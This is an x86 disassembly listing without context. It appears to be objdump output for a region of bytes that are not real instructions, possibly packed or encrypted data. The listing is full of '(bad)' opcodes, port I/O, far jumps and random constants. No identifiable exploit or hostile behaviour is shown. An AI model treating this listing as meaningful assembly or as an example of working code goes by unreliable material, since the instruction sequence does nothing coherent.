  4082bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082c0:	mov    ?,WORD PTR [ebx-0x47]
  4082c3:	push   0xffffffe6
  4082c5:	mov    esp,0x21403fef
  4082ca:	cmp    DWORD PTR [ebx+0x4ce6fdd0],0x7e997482
  4082d4:	xchg   BYTE PTR [ebx],cl
  4082d6:	dec    ecx
  4082d7:	mov    ah,0xa7
  4082d9:	loop   0x40832d
  4082db:	ja     0x408312
  4082dd:	retf   0x359
  4082e0:	js     0x4082f5
  4082e2:	stc    
  4082e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e4:	ret    0x53e0
  4082e7:	mov    DWORD PTR [ecx+ebp*1+0x2e],ecx
  4082eb:	or     edx,ebp
  4082ed:	std    
  4082ee:	(bad)  
  4082ef:	out    dx,al
  4082f0:	out    dx,al
  4082f1:	ins    BYTE PTR es:[edi],dx
  4082f2:	pop    ds
  4082f3:	jae    0x408335
  4082f5:	jbe    0x40828b
  4082f7:	mov    esi,DWORD PTR [edi]
  4082f9:	xchg   DWORD PTR ds:0xeba31e9,ecx
  4082ff:	fisubr DWORD PTR [ecx+0x6177be3a]
  408305:	push   eax
  408306:	mov    dh,al
  408308:	inc    ebx
  408309:	lds    ebx,FWORD PTR [edx-0x4d37c4e0]
  40830f:	pushf  
  408310:	mov    edi,DWORD PTR [esi+ecx*8]
  408313:	out    dx,eax
  408314:	push   ecx
  408315:	xchg   esp,eax
  408316:	fstp   DWORD PTR [esi+edi*8]
  408319:	ret    0x61f5
  40831c:	ror    DWORD PTR [ebx-0x19],0xc
  408320:	ins    BYTE PTR es:[edi],dx
  408321:	mov    ebp,0x4f491cc8
  408326:	(bad)  
  408327:	xchg   ecx,eax
  408328:	add    DWORD PTR [edx],eax
  40832a:	and    DWORD PTR [esi-0x15b890a0],ebp
  408330:	and    DWORD PTR [eax+ebp*4],ecx
  408333:	das    
  408334:	int    0x17
  408336:	or     dl,BYTE PTR [ebx+0x1]
  408339:	jl     0x4082fa
  40833b:	mov    edi,0x2d777674
  408340:	and    eax,0x180f2ed5
  408345:	call   DWORD PTR [ebx]
  408347:	sub    DWORD PTR [ecx-0x6c47c349],ecx
  40834d:	mov    esp,0xab7d3ae1
  408352:	ss mov ebp,0xcad3bb28
  408358:	push   eax
  408359:	push   edi
  40835a:	jmp    0xc125b268
  40835f:	mov    edx,0x28fc992a
  408364:	mov    dh,0x1f
  408366:	retf   0x7c6d
  408369:	aam    0x4e
  40836b:	jbe    0x408382
  40836d:	xchg   edx,eax
  40836e:	xchg   esi,eax
  40836f:	not    dh
  408371:	scas   al,BYTE PTR es:[edi]
  408372:	xor    BYTE PTR [ebp-0x36],cl
  408375:	std    
  408376:	xlat   BYTE PTR ds:[ebx]
  408377:	outs   dx,BYTE PTR ds:[esi]
  408378:	pop    ss
  408379:	clc    
  40837a:	and    bl,BYTE PTR [edx+0x5fb3a0d4]
  408380:	out    0x7c,eax
  408382:	sbb    DWORD PTR [esp+ecx*1+0x3f],esp
  408386:	sub    eax,0xe0c59971
  40838b:	arpl   WORD PTR [edi+0x486a234d],bx
  408391:	cdq    
  408392:	aam    0xfd
  408394:	sbb    al,0xe
  408396:	(bad)  
  408397:	push   esi
  408398:	ret    0xf826
  40839b:	clc    
  40839c:	xor    eax,0xc59fc9be
  4083a1:	mov    cl,0xe9
  4083a3:	push   ds
  4083a4:	lahf   
  4083a5:	and    ecx,DWORD PTR [esi-0x8]
  4083a8:	add    eax,0x27d85748
  4083ad:	dec    edx
  4083ae:	jbe    0x408343
  4083b0:	int    0x7e
  4083b2:	clc    
  4083b3:	ins    DWORD PTR es:[edi],dx
  4083b4:	inc    ebp
  4083b5:	psubd  mm0,QWORD PTR [ecx]
  4083b8:	dec    ecx
  4083b9:	mov    edi,0x2989aaeb
  4083be:	(bad)  
  4083bf:	cmp    al,0x79
  4083c1:	mov    eax,ds:0xb4e8a787
  4083c6:	mov    esp,0x77c2b6c7
  4083cb:	or     al,0xde
  4083cd:	and    eax,0xda204db
  4083d2:	fld    QWORD PTR [eax+0x256a53da]
  4083d8:	scas   al,BYTE PTR es:[edi]
  4083d9:	dec    ebp
  4083da:	dec    edx
  4083db:	rcl    DWORD PTR [esi],0xe2
  4083de:	fsub   st,st(7)
  4083e0:	rcr    BYTE PTR [edi+0x7a],cl
  4083e3:	scas   eax,DWORD PTR es:[edi]
  4083e4:	jne    0x4083c3
  4083e6:	sub    al,0xd9
  4083e8:	outs   dx,BYTE PTR ds:[esi]
  4083e9:	retf   
  4083ea:	fidiv  WORD PTR [ecx]
  4083ec:	ret    0x8018
  4083ef:	pop    edi
  4083f0:	jnp    0x4083b1
  4083f2:	call   0x9110:0xe4b94de1
  4083f9:	fucomi st,st(2)
  4083fb:	xchg   ecx,eax
  4083fc:	call   0xcbf1899e
  408401:	enter  0x3fbd,0x48
  408405:	pop    ecx
  408406:	jl     0x4083d6
  408408:	pop    ebx
  408409:	shl    DWORD PTR [ebp-0x28],cl
  40840c:	add    dl,dl
  40840e:	pop    esi
  40840f:	data16 (bad) 
  408411:	int3   
  408412:	xchg   ecx,eax
  408413:	cmp    ah,bh
  408415:	add    ebp,DWORD PTR [edi]
  408417:	sar    cl,cl
  408419:	lea    ecx,[esi]
  40841b:	inc    edi
  40841c:	inc    esi
  40841d:	dec    edx
  40841e:	push   ds
  40841f:	call   0x9ad262fa
  408424:	sbb    al,0x6f
  408426:	gs aaa 
  408428:	mov    dl,0xa3
  40842a:	popf   
  40842b:	sub    BYTE PTR [edi],ah
  40842d:	jmp    0xcc35:0x25064ffd
  408434:	out    dx,al
  408435:	jmp    0x6742:0x21349fb2
  40843c:	or     edi,esi
  40843e:	in     al,0x1b
  408440:	lahf   
  408441:	and    DWORD PTR [eax],ebp
  408443:	lahf   
  408444:	ret    0xd48b
  408447:	ins    DWORD PTR es:[edi],dx
  408448:	add    ecx,edx
  40844a:	(bad)  
  40844c:	jmp    0x4cd71b
  408451:	jmp    0xefab:0xb353cff5
  408458:	or     bh,BYTE PTR [eax]
  40845a:	push   es
  40845b:	addr16 pop ebp
  40845d:	pop    ss
  40845e:	neg    bl
  408460:	(bad)
  408464:	and    eax,0xa4e5f249
  408469:	jg     0x40846c
  40846b:	jle    0x408459
  40846d:	fs aam 0x55
  408470:	jo     0x4083fc
  408472:	in     eax,0xda
  408474:	push   esi
  408475:	mov    eax,0x2a06f9a5
  40847a:	or     eax,DWORD PTR [edx-0x4a627c0c]
  408480:	sub    DWORD PTR [edx],ebp
  408482:	into   
  408483:	pop    ebp
  408485:	pop    ebx
  408486:	add    BYTE PTR [esi],0xc0
  408489:	shr    bl,0x9c
  40848c:	stos   DWORD PTR es:[edi],eax
  40848d:	mov    gs,WORD PTR [ebx+0x14ef81fb]
  408493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408494:	inc    edi
  408495:	(bad)  
  408496:	enter  0x73f9,0xe5
  40849a:	mov    eax,0x53061b08
  40849f:	jg     0x408508
  4084a1:	outs   dx,DWORD PTR ds:[esi]
  4084a2:	bound  edx,QWORD PTR [esp+edx*8-0x2a]
  4084a6:	sldt   WORD PTR [edi-0x1c]
  4084aa:	sbb    dl,BYTE PTR [ecx-0x3f]
  4084ad:	sub    eax,0xfc5fc08a
  4084b2:	push   0x7f
  4084b4:	jle    0x408535
  4084b6:	stos   BYTE PTR es:[edi],al
  4084b7:	mov    edx,DWORD PTR [edx-0x32]
  4084ba:	or     al,0x2b
  4084bc:	sar    BYTE PTR [edi-0x46],1
  4084bf:	retf   
  4084c0:	mov    al,bl
  4084c2:	pushf  
  4084c3:	mov    edx,0x81b1441c
  4084c8:	dec    esp
  4084c9:	jge    0x40853e
  4084cb:	sbb    al,0xe3
  4084cd:	dec    edi
  4084ce:	mov    al,0x95
  4084d0:	cmp    BYTE PTR [ebp+0x20b5b2c2],cl
  4084d6:	xchg   edi,eax
  4084d7:	js     0xf86615fa
  4084dd:	push   ebx
  4084de:	or     eax,edi
  4084e0:	xor    BYTE PTR [edx-0x7d464735],ch
  4084e6:	sbb    DWORD PTR [ebx-0x6d],esp
  4084e9:	btc    esp,edx
  4084ec:	mov    esp,0xbd9afafd
  4084f1:	jecxz  0x40847c
  4084f3:	or     al,0x74
  4084f5:	in     eax,dx
  4084f6:	enter  0x1ae0,0x30
  4084fa:	and    edi,DWORD PTR [esi+0x5c]
  4084fd:	dec    edx
  4084fe:	nop
  4084ff:	retf   0x15d7
  408502:	and    DWORD PTR [ebp+0x7f23e75b],ebp
  408508:	jmp    0xf087:0x493a3836
  40850f:	push   esi
  408510:	ins    BYTE PTR es:[edi],dx
  408511:	mov    ecx,0xc7e93580
  408516:	adc    edi,eax
  408518:	sbb    DWORD PTR [esi+0x4f],ecx
  40851b:	jmp    FWORD PTR [edi+0x5f]
  40851e:	test   DWORD PTR [edx],ebp
  408520:	or     edi,0xffffffed
  408523:	and    al,0x63
  408525:	leave  
  408526:	and    dh,al
  408528:	push   es
  408529:	push   ss
  40852a:	push   edi
  40852b:	lds    esp,FWORD PTR [eax-0x26]
  40852e:	(bad)  
  40852f:	aad    0xf9
  408531:	and    bh,ch
  408533:	adc    DWORD PTR [ebp+esi*1-0x40],eax
  408537:	inc    esi
  408538:	dec    esp
  408539:	xchg   esi,eax
  40853a:	jno    0x408512
  40853c:	and    BYTE PTR [edi+ebx*1],dl
  40853f:	pop    edx
  408540:	out    dx,eax
  408541:	and    eax,0xe85cb2f1
  408546:	and    eax,0x3553b007
  40854b:	sbb    eax,0xf2efe59c
  408550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408551:	jns    0x4085ae
  408553:	jb     0x408560
  408555:	dec    esp
  408556:	xor    cl,BYTE PTR [esi-0x4c]
  408559:	mov    WORD PTR [ebx+ecx*8+0xc],es
  40855d:	and    DWORD PTR [ebx],edx
  40855f:	out    0xec,eax
  408561:	push   edi
  408562:	jb     0x66980376
  408568:	jg     0x4084f4
  40856a:	pop    ebx
  40856b:	mov    ds:0x87a88d6e,eax
  408570:	es jb  0x4085a3
  408573:	in     eax,dx
  408574:	mov    ebp,esi
  408576:	and    DWORD PTR [eax+0x3c3b9bc],eax
  40857c:	fwait
  40857d:	mov    esp,0xdb3d5fdb
  408582:	jp     0x40856a
  408584:	into   
  408585:	cmp    DWORD PTR [eax-0x1],ebp
  408588:	mul    DWORD PTR [ecx]
  40858a:	repnz push esi
  40858c:	fs push esp
  40858e:	aaa    
  40858f:	pop    ecx
  408590:	mov    ds:0xdf63e2f8,eax
  408595:	jg     0x4085bc
  408597:	retf   
  408598:	outs   dx,BYTE PTR ds:[esi]
  408599:	and    dl,BYTE PTR [edx]
  40859b:	fwait
  40859c:	ss (bad) 
  40859e:	jb     0x4085b2
  4085a0:	data16 mov dl,0xc5
  4085a3:	mov    eax,0x48e90188
  4085a8:	add    eax,DWORD PTR [eax]
  4085aa:	add    BYTE PTR [edi-0x6],al
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x8ecffc64
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x408598
  4085c4:	adc    ah,BYTE PTR [ecx+0x64]
  4085c7:	aad    0x55
  4085c9:	sti    
  4085ca:	xchg   BYTE PTR [ecx+0x4de560ab],bh
  4085d0:	sbb    dh,BYTE PTR [ebx]
  4085d2:	adc    ebp,DWORD PTR ds:0x46d9980
  4085d8:	test   BYTE PTR [edi+ecx*1],ah
  4085db:	test   BYTE PTR [edx+ecx*4],cl
  4085de:	fwait
  4085df:	inc    ecx
  4085e0:	leave  
  4085e1:	adc    sp,0x4d
  4085e5:	mov    ds:0xd6cc3dc7,al
  4085ea:	mov    ecx,0x85c14a94
  4085ef:	mov    bl,0x9b
  4085f1:	inc    eax
  4085f2:	dec    ebx
  4085f3:	cdq    
  4085f4:	aas    
  4085f5:	xchg   edi,eax
  4085f6:	xchg   ebx,eax
  4085f7:	aam    0x32
  4085f9:	jno    0x40860e
  4085fb:	in     eax,dx
  4085fc:	aam    0x8b
  4085fe:	pushf  
  4085ff:	fucomi st,st(1)
  408601:	or     eax,0xf6f96214
  408606:	lods   al,BYTE PTR ds:[esi]
  408607:	out    dx,al
  408608:	loopne 0x408647
  40860a:	or     DWORD PTR [edi-0x6391114f],ecx
  408610:	pop    ss
  408611:	sub    BYTE PTR [eax+edx*2-0x2807b78f],bh
  408618:	and    al,0x85
  40861a:	dec    edx
  40861b:	(bad)  
  40861c:	and    BYTE PTR [edi+0x3c],bl
  40861f:	or     eax,0xb510db33
  408624:	sbb    ebx,DWORD PTR [ecx+0x25]
  408627:	and    BYTE PTR [eax+eax*4-0x23],bl
  40862b:	cmp    BYTE PTR [edx+0x6ee1b8a9],al
  408631:	sar    BYTE PTR [ebx+0x5097c5df],1
  408637:	jae    0x4086b4
  408639:	shl    BYTE PTR [esi-0x7f],0xf7
  40863d:	lods   eax,DWORD PTR ds:[esi]
  40863e:	ds loopne 0x408674
  408641:	push   0x2d
  408643:	scas   eax,DWORD PTR es:[edi]
  408644:	mov    al,ds:0xe3ed542c
  408649:	aam    0x37
  40864b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40864c:	lods   eax,DWORD PTR ds:[esi]
  40864d:	adc    al,0x6f
  40864f:	adc    esi,ecx
  408651:	pop    ebx
  408652:	xor    al,0x96
  408654:	push   es
  408655:	xor    edx,ebp
  408657:	add    BYTE PTR [esi],cl
  408659:	icebp  
  40865a:	in     eax,0x6e
  40865c:	(bad)  
  40865d:	jle    0x40865a
  40865f:	nop
  408660:	aaa    
  408661:	stos   DWORD PTR es:[edi],eax
  408662:	xchg   BYTE PTR [edi+0xa],bh
  408665:	fninit 
  408667:	popf   
  408668:	rep stos DWORD PTR es:[edi],eax
  40866a:	mov    ch,0x11
  40866c:	das    
  40866d:	pushf  
  40866e:	lods   eax,DWORD PTR es:[esi]
  408670:	push   ds
  408671:	pushfw 
  408673:	ret    
  408674:	push   ss
  408675:	lock sub BYTE PTR [edi],bh
  408678:	fucomp st(6)
  40867a:	ret    
  40867b:	mov    edx,0x3e11754e
  408680:	popf   
  408681:	xor    esi,0xffffffa8
  408684:	fdiv   DWORD PTR [ebx+0x4518e9b7]
  40868a:	stos   BYTE PTR es:[edi],al
  40868b:	shl    ch,1
  40868d:	inc    ecx
  40868e:	jp     0x408693
  408690:	jg     0x40868f
  408692:	mov    ds:0x8da174d1,al
  408697:	cmp    eax,0x1ac483f
  40869c:	mov    edi,0x999537ae
  4086a1:	pop    eax
  4086a2:	arpl   WORD PTR [esi],bx
  4086a4:	or     BYTE PTR [ecx],0x6e
  4086a7:	push   ebx
  4086a8:	push   esi
  4086a9:	lods   eax,DWORD PTR ds:[esi]
  4086aa:	test   DWORD PTR [eax],eax
  4086ac:	xor    al,0x9d
  4086ae:	adc    DWORD PTR [ebp-0x243620c1],edi
  4086b4:	into   
  4086b5:	cmp    ecx,ebp
  4086b7:	xor    esi,edi
  4086b9:	call   DWORD PTR [eax+eax*1]
  4086bc:	push   ecx
  4086bd:	mov    eax,ds:0x61987710
  4086c2:	test   BYTE PTR [ebx+0x62],bl
  4086c5:	es (bad) 
  4086c7:	mov    ecx,0xa5155577
  4086cc:	mov    ebp,0x452ec76c
  4086d1:	mov    ch,0x21
  4086d3:	mov    ebp,0x5eaeb0ca
  4086d8:	fnstcw WORD PTR [eax-0x3e]
  4086db:	js     0x40875c
  4086dd:	inc    edi
  4086de:	add    eax,0x1e62a8d
  4086e3:	and    al,BYTE PTR [edi+eax*4]
  4086e6:	push   eax
  4086e7:	addr16 mov edx,0xe849c458
  4086ed:	repz jle 0x408763
  4086f0:	cwde   
  4086f1:	fimul  WORD PTR [ebx-0x60e5e478]
  4086f7:	or     edi,edi
  4086f9:	dec    esp
  4086fa:	jmp    0x572472c0
  4086ff:	clc    
  408700:	mov    al,0x7b
  408702:	repz jl 0x408689
  408705:	sti    
  408706:	pop    ss
  408707:	jle    0x40871c
  408709:	xor    dl,BYTE PTR [edi]
  40870b:	jecxz  0x4086fd
  40870d:	xor    edi,DWORD PTR [ebx+0x206089ea]
  408713:	adc    ah,0xd0
  408716:	sub    eax,0x471872f
  40871b:	add    DWORD PTR es:[ecx+edi*4],esp
  40871f:	or     esi,DWORD PTR [esi]
  408721:	fist   DWORD PTR [ecx-0x4bdb9977]
  408727:	repz inc eax
  408729:	cwde   
  40872a:	cmp    eax,0x6cfff946
  40872f:	inc    edx
  408730:	bound  esi,QWORD PTR [edx+0x78b06036]
  408736:	iret   
  408737:	cmp    al,0x9b
  408739:	fiadd  DWORD PTR [ebp+eiz*8-0x49]
  40873d:	(bad)
  408740:	add    bl,al
  408742:	jp     0x40873c
  408744:	outs   dx,BYTE PTR ds:[esi]
  408745:	cmp    al,0x11
  408747:	sub    al,0x7d
  408749:	adc    cl,BYTE PTR [edi]
  40874b:	mov    ecx,ecx
  40874d:	push   0xffffffe7
  40874f:	leave  
  408750:	adc    edx,DWORD PTR [ebp-0x6d8e2b3c]
  408756:	mov    bl,0x72
  408758:	jmp    0x5fe6aae6
  40875d:	dec    ecx
  40875e:	push   esi
  40875f:	jle    0x4087c2
  408761:	inc    edi
  408762:	cli    
  408763:	xor    ecx,ebp
  408765:	ins    DWORD PTR es:[edi],dx
  408766:	idiv   DWORD PTR [eax-0x58]
  408769:	lods   eax,DWORD PTR ds:[esi]
  40876a:	rol    ebp,1
  40876c:	inc    eax
  40876d:	dec    esp
  40876e:	sub    bh,cl
  408770:	ss push 0xffffff99
  408773:	sbb    BYTE PTR [eax+eax*2+0x7f539f95],cl
  40877a:	or     eax,0xdb174522
  40877f:	or     DWORD PTR [edi+edi*4-0x65c60758],edx
  408786:	int3   
  408787:	(bad)  
  408788:	inc    ecx
  408789:	int3   
  40878a:	jae    0x4087ff
  40878c:	outs   dx,BYTE PTR ds:[esi]
  40878d:	xor    DWORD PTR ds:0xe6057991,esi
  408793:	nop
  408794:	leave  
  408795:	cmp    eax,0x56cc9f44
  40879a:	mov    ?,WORD PTR [ecx+0x24]
  40879d:	adc    al,0x0
  40879f:	fisub  DWORD PTR [edx-0x365accb8]
  4087a5:	pop    esp
  4087a6:	xor    DWORD PTR [esi+eiz*4+0x39ad36f6],ebx
  4087ad:	mov    edi,0xe2c0344
  4087b2:	ins    BYTE PTR es:[edi],dx
  4087b3:	retf   
  4087b4:	push   cs
  4087b5:	mov    WORD PTR [esp+edi*4],fs
  4087b8:	pushf  
  4087b9:	imul   edi,DWORD PTR [ecx+0x65],0x29
  4087bd:	sub    eax,0xe5ca9bdf
  4087c2:	push   ss
  4087c3:	rcl    BYTE PTR [edi+0x50],0xc4
  4087c7:	test   DWORD PTR [edi],0x314b898e
  4087cd:	add    eax,0xaf28d440
  4087d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087d3:	cmp    BYTE PTR [edx-0x41c81651],bl
  4087d9:	mov    ds:0xe9b64d5d,al
  4087de:	push   eax
  4087df:	jae    0x4087c3
  4087e1:	or     esp,DWORD PTR fs:[esi-0x732b4dc1]
  4087e8:	mov    WORD PTR [ebp-0x32],?
  4087eb:	jo     0x40884e
  4087ed:	cmp    ebx,edi
  4087ef:	inc    ebp
  4087f0:	jecxz  0x40881b
  4087f2:	test   BYTE PTR [edi],0xb
  4087f5:	push   0x32
  4087f7:	dec    edx
  4087f8:	ins    BYTE PTR es:[edi],dx
  4087f9:	cli    
  4087fa:	jbe    0x4087df
  4087fc:	add    ch,bl
  4087fe:	inc    esi
  4087ff:	mov    edi,ss
  408801:	mov    dl,0x2
  408803:	or     eax,0x7ef7f248
  408808:	in     eax,dx
  408809:	and    eax,0x890591b9
  40880e:	dec    esp
  40880f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408810:	pop    ss
  408811:	imul   esi,DWORD PTR [edi-0xf],0xf943d8d2
  408818:	xcrypt-ctr (bad)
  408819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40881a:	sahf   
  40881b:	inc    eax
  40881c:	mov    bh,ch
  40881e:	das    
  40881f:	mov    ebx,0xaa7f1740
  408824:	bound  esp,QWORD PTR [eax-0x74408323]
  40882a:	cmc    
  40882b:	push   ebp
  40882c:	stos   DWORD PTR es:[edi],eax
  40882d:	neg    BYTE PTR [ecx]
  40882f:	scas   eax,DWORD PTR es:[edi]
  408830:	neg    DWORD PTR [ebx+0x757d28c3]
  408836:	xor    DWORD PTR [esi+0x61],0xffffffcf
  40883a:	xor    eax,0xf699d3b7
  40883f:	retf   
  408840:	jne    0x40886e
  408842:	jns    0x40885a
  408844:	sahf   
  408845:	scas   al,BYTE PTR es:[edi]
  408846:	xor    BYTE PTR [esi],bl
  408848:	mov    ch,0x82
  40884a:	out    dx,eax
  40884b:	call   0x8689abf5
  408850:	cmp    BYTE PTR [ebx+0x2e],bl
  408853:	dec    edi
  408854:	push   es
  408855:	cmp    eax,0x41a4e7e2
  40885a:	sbb    DWORD PTR [ebp-0x6d196bc4],esp
  408860:	xor    edx,edx
  408862:	dec    esp
  408863:	fild   QWORD PTR [ebx-0x5f]
  408866:	push   ss
  408867:	test   DWORD PTR [edi+0x410920ae],esi
  40886d:	push   esp
  40886e:	adc    eax,0xce105394
  408873:	jns    0x408814
  408875:	push   edi
  408876:	loope  0x40883a
  408878:	je     0x4088f5
  40887a:	jnp    0x4088c1
  40887c:	pop    es
  40887d:	ja     0x408858
  40887f:	jne    0x4088af
  408881:	cmp    BYTE PTR [ebx+0x23],dl
  408884:	and    BYTE PTR [ebx],ch
  408886:	shl    DWORD PTR [edi+0x79890a7a],0xd3
  40888d:	xchg   ebx,eax
  40888e:	xor    al,0xf0
  408890:	lock ds push esp
  408893:	and    eax,0x8fbf9c12
  408898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408899:	pop    esp
  40889a:	pushf  
  40889b:	and    bh,BYTE PTR [ebx-0x4c]
  40889e:	xor    DWORD PTR [edx-0x48],eax
  4088a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088a2:	int3   
  4088a3:	test   eax,0x1dceb654
  4088a8:	call   0xce454915
  4088ad:	mov    DWORD PTR [ebp-0x253b40e8],edi
  4088b3:	sub    ah,BYTE PTR [edi+0x4f605b0a]
  4088b9:	pusha  
  4088ba:	and    eax,0xa43968e3
  4088bf:	jbe    0x4088e1
  4088c1:	lock sahf 
  4088c3:	cmp    ah,0xf
  4088c6:	or     al,0x20
  4088c8:	icebp  
  4088c9:	adc    esp,edi
  4088cb:	nop
  4088cc:	mov    eax,ds:0xdab0043a
  4088d1:	pop    ebx
  4088d2:	dec    ax
  4088d4:	popa   
  4088d5:	ja     0x4088ab
  4088d7:	les    ebp,FWORD PTR [ebx+edi*1-0x25]
  4088db:	or     BYTE PTR [ebx-0x3b9451ad],bl
  4088e1:	xchg   esi,eax
  4088e2:	xchg   ecx,eax
  4088e3:	mov    esp,eax
  4088e5:	sbb    esp,ecx
  4088e7:	cmp    DWORD PTR [edx+esi*2+0x1d],edi
  4088eb:	sbb    esp,eax
  4088ed:	ja     0x4088a3
  4088ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088f0:	pop    edx
  4088f1:	push   esp
  4088f2:	push   cs
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x78bca301],cl
  40890c:	aad    0x15
  40890e:	mov    dl,BYTE PTR [edi+0x207070dc]
  408914:	jge    0x408986
  408916:	jo     0x40891c
  408918:	dec    edi
  408919:	pop    eax
  40891a:	in     al,0x2e
  40891c:	fsub   DWORD PTR [ecx-0x78]
  40891f:	add    ebx,DWORD PTR [eax]
  408921:	fisttp QWORD PTR [ebp+0x16]
  408924:	rcr    BYTE PTR [ebx-0x4a869a39],1
  40892a:	test   DWORD PTR [esi],esi
  40892c:	cmp    bh,BYTE PTR ds:0xb601d6a9
  408932:	test   BYTE PTR [esi+0x1188ba62],ch
  408938:	push   eax
  408939:	dec    ebp
  40893a:	sub    BYTE PTR [eax-0x185e1af6],0x65
  408941:	xor    DWORD PTR [ebx],ebp
  408943:	dec    ebx
  408944:	xor    eax,0xd6bed9d1
  408949:	sbb    DWORD PTR [edx-0x6511a1fb],0xffffffe3
  408950:	push   ebx
  408951:	dec    esp
  408952:	popa   
  408953:	mov    ecx,ss
  408955:	out    0x96,eax
  408957:	cld    
  408958:	gs stc 
  40895a:	ror    ah,1
  40895c:	vcvttss2si ebx,DWORD PTR [edx+0x78]
  408961:	pop    ecx
  408962:	pop    edi
  408963:	mov    cl,0xdb
  408965:	mov    dl,0xe1
  408967:	mov    ebp,0x6494663d
  40896c:	or     dl,cl
  40896e:	inc    eax
  40896f:	das    
  408970:	cmc    
  408971:	mul    BYTE PTR [ecx]
  408973:	aas    
  408974:	lea    ebx,[ebx-0x49]
  408977:	in     eax,dx
  408978:	call   0x90a86ffe
  40897d:	add    bh,BYTE PTR [ebp+0x210eb000]
  408983:	fisttp DWORD PTR [edx]
  408985:	mov    BYTE PTR es:[esi-0x77],0x42
  40898a:	cmp    esi,DWORD PTR [edx]
  40898c:	pop    edi
  40898d:	xchg   ebp,eax
  40898e:	pop    edx
  40898f:	ret    
  408990:	imul   eax,eax,0x35
  408993:	ins    BYTE PTR es:[edi],dx
  408994:	(bad)  
  408995:	xchg   edx,eax
  408996:	push   esi
  408997:	fimul  DWORD PTR [edx+0x2b30cdd3]
  40899d:	neg    DWORD PTR [edi+0x53d161a6]
  4089a3:	pusha  
  4089a4:	add    BYTE PTR [edi],0xa9
  4089a7:	arpl   WORD PTR [eax],cx
  4089a9:	add    BYTE PTR [edi],ah
  4089ab:	xor    al,0x85
  4089ad:	push   esi
  4089ae:	ret    0x2e17
  4089b1:	ficomp WORD PTR [edx-0x308e3c29]
  4089b7:	mov    edx,0xd2e43e58
  4089bc:	(bad)  
  4089bd:	push   esp
  4089be:	cmp    bl,bl
  4089c0:	test   esp,ecx
  4089c2:	in     al,dx
  4089c3:	mov    bh,ch
  4089c5:	add    eax,0x5141ce32
  4089ca:	bound  ebp,QWORD PTR [esi+ebp*1-0x5a18d7e8]
  4089d1:	sbb    bh,0x73
  4089d4:	mov    ch,0x2e
  4089d6:	leave  
  4089d7:	and    eax,edi
  4089d9:	ret    0xf215
  4089dc:	bound  ecx,QWORD PTR [eax+ecx*4]
  4089df:	mov    ebx,0x7cacea80
  4089e4:	and    al,0x9a
  4089e6:	ds mov bh,0x66
  4089e9:	sbb    DWORD PTR [esp+esi*4],ebp
  4089ec:	dec    esi
  4089ed:	mov    eax,ds:0x197fc9ce
  4089f2:	fsub   st,st(7)
  4089f4:	adc    eax,0x1e577707
  4089f9:	mov    edi,0x8c2f479d
  4089fe:	xchg   BYTE PTR [esi],cl
  408a00:	adc    bh,BYTE PTR [ecx+0x7b6cd3ce]
  408a06:	(bad)  
  408a07:	jmp    0x90cf:0x26cf1718
  408a0e:	sbb    DWORD PTR [esi+ecx*2+0x68107a21],esi
  408a15:	cs inc ebp
  408a17:	and    DWORD PTR [esi-0x34],edi
  408a1a:	je     0x408a14
  408a1c:	mov    eax,ds:0xc619df4
  408a21:	into   
  408a22:	cmp    dh,ah
  408a24:	cwde   
  408a25:	arpl   WORD PTR [esi-0x6],cx
  408a28:	mov    bh,0x96
  408a2a:	add    dh,BYTE PTR [eax-0x405eb588]
  408a30:	and    bl,cl
  408a32:	mov    ebx,0xcfe5d47a
  408a37:	outs   dx,DWORD PTR ds:[esi]
  408a38:	not    DWORD PTR [ebx+0x42]
  408a3b:	jl     0x408a60
  408a3d:	ror    BYTE PTR [esi+ebp*4+0x67b173ad],1
  408a44:	pusha  
  408a45:	in     eax,dx
  408a46:	data16 or BYTE PTR [ebx+0x4],dh
  408a4a:	test   BYTE PTR [esp+esi*4+0x4d],cl
  408a4e:	mov    cl,0x9c
  408a50:	push   0x17ea9fc1
  408a55:	(bad)  
  408a56:	push   esp
  408a57:	loopne 0x408a3e
  408a59:	pop    esi
  408a5a:	sbb    eax,DWORD PTR [ebx+edi*4-0x44]
  408a5e:	fcom   QWORD PTR [ecx-0x28]
  408a61:	aad    0xc6
  408a63:	icebp  
  408a64:	out    dx,eax
  408a65:	test   BYTE PTR [ebp-0x79],dh
  408a68:	mov    WORD PTR [edi+0x3b7f1c26],?
  408a6e:	xor    ebp,DWORD PTR [edx+0x61]
  408a71:	adc    bh,cl
  408a73:	icebp  
  408a74:	mov    dl,BYTE PTR [edi+edi*1-0x59581026]
  408a7b:	mov    esi,0x19ff7496
  408a80:	das    
  408a81:	out    0x91,al
  408a83:	ds jnp 0x408a4d
  408a86:	dec    ecx
  408a87:	repnz aas 
  408a89:	push   0x3c
  408a8b:	xchg   esp,eax
  408a8c:	mov    eax,ebx
  408a8e:	cmc    
  408a8f:	lds    esi,FWORD PTR [ebp+edx*4-0x45]
  408a93:	adc    eax,0xcd337463
  408a98:	and    BYTE PTR [edx],0x49
  408a9b:	fld    TBYTE PTR [esi]
  408a9d:	pushf  
  408a9e:	lea    esi,[ecx]
  408aa0:	mov    cs,WORD PTR [esi+ecx*8-0x12004f45]
  408aa7:	fistp  QWORD PTR [ebx]
  408aa9:	pop    ecx
  408aaa:	jg     0x408a54
  408aac:	cmc    
  408aad:	cmc    
  408aae:	sbb    BYTE PTR [edi+ebx*8+0x12],0xa9
